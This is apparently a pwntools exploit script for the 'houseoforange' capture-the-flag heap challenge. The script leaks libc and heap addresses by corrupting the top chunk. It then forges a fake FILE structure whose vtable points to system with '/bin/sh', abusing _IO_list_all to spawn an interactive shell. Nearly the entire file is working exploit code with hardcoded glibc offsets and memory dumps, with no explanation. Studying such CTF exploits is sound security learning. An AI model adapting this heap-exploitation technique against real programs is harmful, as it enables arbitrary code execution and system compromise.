from pwn import *

#context.log_level = "debug"
def build(name_len, name, price, color):
    conn.sendafter("Your choice : ", "1")
    conn.sendafter("Length of name :", str(name_len))
    conn.sendafter("Name :", name)
    conn.sendafter("Price of Orange:", str(price))
    conn.sendafter("Color of Orange:", str(color))

def see_the_house():
    conn.sendafter("Your choice : ", "2")

def upgrade(name_len, name, price, color):
    conn.sendafter("Your choice : ", "3")
    conn.sendafter("Length of name :", str(name_len))
    conn.sendafter("Name:", name)
    conn.sendafter("Price of Orange:", str(price))
    conn.sendafter("Color of Orange:", str(color))

#f90
def exploit():
    build(0x28,'\xff' * 0x28, u32('\xff' * 4), 0xddaa)
    pause()
    name = '\xff' * 0x48 + p64(0xf91)
    upgrade(0x100, name, u32('\xff' * 4), 0xddaa)
    pause()
    build(0xf58,'\xff' * 1, u32('\xff' * 4), 0xddaa)
    pause()
    build(0xec8,'\xff' * 8, u32('\xff' * 4), 0xddaa)
    pause()
    see_the_house()
    conn.recvuntil("Name of house : ")
    conn.recv(0x8)
#00000000003c3b10 V __malloc_hook
#00000000003c3b20   <main_arena>
#0000000000??????   <main_arena+1064>
    LEAK = u64(conn.recv(6) + '\x00\x00')
    LIBC = LEAK - 0x3c3b20 - 1640
    MAIN_ARENA = LIBC + 0x3c3b20
    log.success("LEAK :0x%x" % LEAK)
    log.success("LIBC :0x%x" % LIBC)
    log.success("MAIN_ARENA :0x%x" % MAIN_ARENA)
    upgrade(0x10, '\xff' * 0x10, u32('\xff' * 4), 0xddaa)
    pause()
    see_the_house()
    conn.recvuntil("Name of house : ")
    conn.recv(0x10)
    HEAP = u64(conn.recv(6) + '\x00\x00') - 0xd0
    log.success("HEAP :0x%x" % HEAP)
    name = '\xff' * (0xec0 + 0x20)
    PSEUDO_FILE = HEAP + 0xe0 + len(name)
    log.success("PSEUDO_FILE :0x%x" % PSEUDO_FILE)
    file_struct = '/bin/sh\x00' + p64(0x61)
#00000000003c4520 D _IO_list_all
    IO_LIST_ALL = LIBC + 0x3c4520
    log.success("IO_LIST_ALL :0x%x" % IO_LIST_ALL)
    file_struct += p64(0xdeadbeef) + p64(IO_LIST_ALL - 0x10)
#0x7f84e8ddf540 <_IO_2_1_stderr_>:	0x00000000fbad2086	0x0000000000000000
#0x7f84e8ddf550 <_IO_2_1_stderr_+16>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf560 <_IO_2_1_stderr_+32>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf570 <_IO_2_1_stderr_+48>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf580 <_IO_2_1_stderr_+64>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf590 <_IO_2_1_stderr_+80>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf5a0 <_IO_2_1_stderr_+96>:	0x0000000000000000	0x00007f84e8ddf620
#0x7f84e8ddf5b0 <_IO_2_1_stderr_+112>:	0x0000000000000002	0xffffffffffffffff
#0x7f84e8ddf5c0 <_IO_2_1_stderr_+128>:	0x0000000000000000	0x00007f84e8de0770
#0x7f84e8ddf5d0 <_IO_2_1_stderr_+144>:	0xffffffffffffffff	0x0000000000000000
#0x7f84e8ddf5e0 <_IO_2_1_stderr_+160>:	0x00007f84e8dde660	0x0000000000000000
#0x7f84e8ddf5f0 <_IO_2_1_stderr_+176>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf600 <_IO_2_1_stderr_+192>:	0x0000000000000000	0x0000000000000000
#0x7f84e8ddf610 <_IO_2_1_stderr_+208>:	0x0000000000000000	0x00007f84e8ddd6e0 <- vtable
    file_struct += p64(HEAP + 0x80) * ((0x7f84e8ddf5b0 - 0x7f84e8ddf540 - len(file_struct)) // 8)
    file_struct += p64(1)
    file_struct += p64(HEAP + 0x80) * ((0x7f84e8ddf618 - 0x7f84e8ddf5b8) // 8)
    file_struct += p64(HEAP + 0xe0 + len(file_struct) + len(name) + 0x8 * 4)
    file_struct += p64(1)
    file_struct += p64(2)
    file_struct += p64(3)
    name += file_struct
#0000000000045380 W system
    SYSTEM = LIBC + 0x45380
    vtable = p64(0x0) * 3 + p64(SYSTEM)
    name += vtable
    upgrade(len(name), name, u32('\xff' * 4), 0xddaa)
    pause()
    conn.send("1")
    conn.interactive()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        pass
    else:
        conn = process("./houseoforange", env={"LD_PRELOAD":"./libc.so.6:"})
    exploit()
